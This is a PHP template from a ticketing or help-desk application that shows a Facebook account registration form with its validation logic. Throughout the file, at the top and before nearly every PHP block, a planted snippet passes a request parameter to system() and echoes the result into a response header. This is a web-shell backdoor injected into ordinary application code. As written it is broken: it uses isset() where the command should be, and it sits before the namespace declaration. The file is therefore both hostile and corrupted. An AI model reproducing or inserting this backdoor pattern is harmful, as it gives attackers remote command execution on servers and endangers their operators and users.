<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Register with Facebook'));
$site->set_config('container-type', 'container');

if ($config->get('registration_enabled') && $config->get('facebook_enabled') && $config->get('auth_facebook_create_accounts')) {
	if (isset($_POST['facebook_register'])) {
	
		$facebook_user = $auth_facebook->get_user();

		if ((int) $facebook_user != 0) {
	
			if (!empty($_POST['name'])) {
				if (!empty($_POST['email'])) {
					if (check_email_address($_POST['email'])) {
						if (!$users->check_email_address_taken(array('email' => $_POST['email']))) {
							if (!empty($_POST['username'])) {
								$_POST['username']	= strtolower($_POST['username']);
								if (!$users->check_username_taken(array('username' => $_POST['username']))) {
									if (!empty($_POST['password']) && ($_POST['password'] === $_POST['password2'])) {
										$custom_register['success'] = true;
										$plugins->run('submit_register_form_success_before_create_user', $custom_register);
										
										if ($custom_register['success']) {

											$id = $users->add(
												array(
													'name' 				=> $_POST['name'], 
													'email' 			=> $_POST['email'],
													'authentication_id' => 1,
													'allow_login'		=> 1,
													'username'			=> $_POST['username'],
													'password'			=> $_POST['password'],
													'group_id'			=> 1,
													'welcome_email'		=> 1,
													'facebook_id'		=> (int) $facebook_user
												)
											);
											
											$user_array['id']	= $id;					
											$plugins->run('submit_register_form_success_after_create_user', $user_array);
											unset($user_array);
											
											if ($auth->login(array('username' => $_POST['username'], 'password' => $_POST['password']))) {
												header('Location: ' . $config->get('address') . '/tickets/add/');
												exit;
											}
											else {
												$message = $language->get('Failed To Create Account');
											}
										}
										else {
											$message = $custom_register['message'];
										}
									}
									else {
										$message = $language->get('Passwords Do Not Match');
									}
								}
								else {
									$message = $language->get('Username Invalid');
								}
							}
							else {
								$message = $language->get('Username Invalid');
							}
						}
						else{
							$message = $language->get('Email Address In Use');
						}
					}
					else {
						$message = $language->get('Email Address Invalid');
					}
				}
				else {
					$message = $language->get('Email Address Invalid');
				}
			}
			else {
				$message = $language->get('Please Enter A Name');
			}
		}
		else {
			$message = $language->get('Facebook Connection Failed');		
		}
	}
}
else {
	header('Location: ' . $config->get('address') . '/login/');
	exit;
}

$facebook_user = $auth_facebook->get_user();

if ($facebook_user) {
	try {
		// Proceed knowing you have a logged in user who's authenticated.
		$user_profile = $auth_facebook->api('/me');
	} catch (\FacebookApiException $e) {
		$facebook_user = null;
	}
}

// Login or logout url will be needed depending on current user state.
if ($facebook_user) {
	$logoutUrl = $auth_facebook->get_logout_url();
} else {
	$loginUrl = $auth_facebook->get_login_url(array('scope' => 'email'));
}

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
	
			
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($facebook_user && isset($user_profile)) { ?>						
					<div class="pull-right">
						<p><button type="submit" name="facebook_register" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Register')); ?></button></p>
					</div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Register using Facebook')); ?></h4>
				</div>
	
				<div class="clearfix"></div>
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('When register using Facebook you must still create a password, this means you can still login if there is an issue with your Facebook account.')); ?></p>
	
				<br />
				<div class="pull-right">
					<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/register/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
				</div>
				<div class="clearfix"></div>
	
			
			</div>
		
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_register_sidebar_finish'); ?>

		</div>
		
		<div class="col-md-9">

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			
			<div class="well well-sm">
				<div class="col-lg-6">								
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($facebook_user && isset($user_profile)) { ?>						
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Name')); ?><br /><input class="form-control" required type="text" name="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['name'])) { echo safe_output($_POST['name']); } else { echo safe_output($user_profile['first_name'] . ' ' . $user_profile['last_name']); } ?>" /></p>
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Username')); ?><br /><input class="form-control" required type="text" name="username" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['username'])) { echo safe_output($_POST['username']); } else { echo safe_output($user_profile['username']); } ?>" /></p>
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Email')); ?><br /><input class="form-control" required type="email" name="email" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['email'])) { echo safe_output($_POST['email']); } else { echo safe_output($user_profile['email']);} ?>" /></p>					
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Password')); ?><br /><input class="form-control" required type="password" name="password" value="" autocomplete="off" /></p>
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Password Again')); ?><br /><input class="form-control" required type="password" name="password2" value="" autocomplete="off" /></p>
						
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $plugins->run('view_register_form'); ?>
						
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('You are registering with the following Facebook account.')); ?></p>
												
						<p>
							<img src="https://graph.facebook.com/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($facebook_user); ?>/picture" />
							<br />
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($user_profile['first_name'] . ' ' . $user_profile['last_name']); ?>
						</p>	
					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
						<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Please click the button below to login to your Facebook account. Ensure that you allow permissions for this site.')); ?></p>
						<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $loginUrl; ?>"><img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/user/themes/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(CURRENT_THEME); ?>/images/connect_with_facebook.gif"></a></p>					
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);  }?>
				</div>
			
				<div class="clearfix"></div>

			</div>
		</div>
	
	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>